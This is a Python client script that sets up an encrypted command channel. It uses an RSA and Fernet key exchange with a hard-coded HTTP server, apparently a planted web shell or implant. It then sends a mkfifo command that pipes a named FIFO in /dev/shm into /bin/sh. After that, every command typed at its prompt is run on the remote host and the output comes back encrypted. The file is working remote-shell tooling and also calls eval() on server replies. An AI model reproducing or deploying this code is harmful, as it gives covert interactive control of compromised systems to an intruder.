#!/sbin/python3
import requests
import json
import sys
import random
import threading
from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import (
    serialization, hashes
)
from cryptography.hazmat.primitives.asymmetric import (
    padding, rsa
)


class asymmetric():
    def __init__(self, key_size=True):
        self.private_key = None
        if key_size:
            self.key_size = 4096

    def generate(self):
        self.private_key = rsa.generate_private_key(
            public_exponent=65537, key_size=self.key_size,
            backend=default_backend()
        )

        self.public_key = self.private_key.public_key()
        return self.public_key

    def public_key_serialization(self):
        self.serial_public_key = self.public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        return self.serial_public_key

    def decrypt_message(self, message, private_key=True):
        private_key = self.private_key if private_key else private_key
        return private_key.decrypt(
            message,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA512()),
                algorithm=hashes.SHA512(),
                label=None
            )
        )

    @staticmethod
    def encrypted_message(message: str, public_key):
        return public_key.encrypt(
            message.encode(),
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA512()),
                algorithm=hashes.SHA512(),
                label=None
            )
        )

    @staticmethod
    def import_public_key(public_key_serial: str):
        return serialization.load_pem_public_key(
            public_key_serial.encode(),
            backend=default_backend()
        )


class symmetric():
    def __init__(self, static_key):
        self.static_key = static_key

    def encrypt(self, string_data):
        return Fernet(self.static_key).encrypt(string_data.encode())

    def decrypt(self, encrypt_data):
        return Fernet(self.static_key).decrypt(encrypt_data)


def symmetric_request(request_post_key_private, static_key, cmd, _print=True):
    global crypt_static
    crypt_static = symmetric(static_key)
    request_post_key_private_encrypt = crypt_static.encrypt(str(request_post_key_private))
    try:
        session_encrypt = crypt_static.encrypt(str(session))
        cmd_encrypt = crypt_static.encrypt(cmd)

        if _print:
            print('Menssage: ', cmd)
            print('Menssage encrypt: ', cmd_encrypt)

        r = requests.post(
            url,
            data={
                "key": "1234",
                "msg": f'{cmd_encrypt}',
                "session": f'{session_encrypt}',
                "request_post_key_private": f'{request_post_key_private_encrypt}',
                'internal_count': '505',
            }
        )
        try:
            return eval(r.text)['cmd_output']
        except:
            return r.text
    except:
        return None


def connect_asymmetric():
    try:
        print('Generate keys [public|private]')
        crypt = asymmetric()
        crypt.generate()
        my_public_key = crypt.public_key_serialization()
        # x = crypt.encrypted_message('hola', my_public_key)
        # print(f'Local encrypt\n', x)
    except:
        print(1)
        sys.exit(1)

    try:
        r = requests.post(
            url,
            data={
                'key': f'{request_post_key}',
                'internal_count': '1'
            }
        )
        open('tmp.json', 'w').write(r.text)

        with open('tmp.json', 'r') as read_file:
            request_data = json.load(read_file)
    except:
        print(2)
        sys.exit(1)

    try:
        print(f'Local public key ({len(my_public_key)})')
        print(f'Remote public key ({len(request_data["public_key"])})\n')
        remote_public_key = asymmetric.import_public_key(request_data['public_key'])
    except:
        print(3)
        sys.exit(1)

    try:
        print(f'Send public key to remote ({len(my_public_key.decode())})')
        user_account = input('User account: ')
        key_account = input('Key account: ')

        user_account_encrypt = crypt.encrypted_message(message=f'{user_account}', public_key=remote_public_key)
        key_account_encrypt = crypt.encrypted_message(message=f'{key_account}', public_key=remote_public_key)

        r = requests.post(
            url,
            data={
                'internal_count': '2',
                'user_account': f'{user_account_encrypt}',
                'key_account': f'{key_account_encrypt}',
                #'user_account': f'{user_account}',
                #'key_account': f'{key_account}',
                'public_key': f'{my_public_key.decode()}'
            }
        )
        print(r.text)
        open('tmp.json', 'w').write(r.text)

        with open('tmp.json', 'r') as read_file:
            request_data = json.load(read_file)
    except Exception as e:
        print(f'4:\n {e}')
        sys.exit(1)

    try:
        print(
            f'Remote encrypt static key ({len(eval(request_data["static_key"]))})'
        )

        static_key = eval(
            crypt.decrypt_message(
                eval(request_data["static_key"])
            )
        )

    except:
        print(5)
        sys.exit(1)

    try:
        msg = crypt.encrypted_message(message=f'{static_key}', public_key=remote_public_key)
        print(f'\nLocal encrypt ({len(msg)})')

        r = requests.post(
            url,
            data={
                'key': f'{request_post_key}',
                'internal_count': '3',
                'static_key': f'{msg}',
            }
        )

        open('tmp.json', 'w').write(r.text)

        with open('tmp.json', 'r') as read_file:
            request_data = json.load(read_file)

        print(f'Remote encrypt ({len(eval(request_data["static_key"]))})')
        if eval(request_data['status_code']):
            print('Symmetric key: ', static_key == eval(
                crypt.decrypt_message(
                    eval(request_data["static_key"])
                )
            ))
            request_post_key_private = eval(
                crypt.decrypt_message(
                    eval(request_data['request_post_key_private'])
                )
            )
            return request_post_key_private, static_key
        return None, None
    except Exception as e:
        print(e)
        sys.exit(1)


def main():
    request_post_key_private, static_key = connect_asymmetric()
    threading.Thread(
        target=symmetric_request,
        args=(
            request_post_key_private,
            static_key,
            create_mkfifo_file,
            False
        )
    ).start()

    while True:
        try:
            cmd = input('>> ')
            cmd = f'echo "{cmd}" > /dev/shm/input.{session}'
            r = symmetric_request(request_post_key_private, static_key, cmd, False)
            print(crypt_static.decrypt(encrypt_data=eval(r)).decode())
        except:
            print('Error')


if __name__ == '__main__':
    url = 'http://192.168.50.218:8080/'
    request_post_key = 1234
    session = random.randrange(1000, 9999)
    stdin = f'/dev/shm/input.{session}'
    stdout = f'/dev/shm/output.{session}'
    create_mkfifo_file = f'mkfifo {stdin}; tail -f {stdin} | /bin/sh 2>&1 > {stdout}'
    bash_shell_script = f'script /dev/null -c bash'
    main()
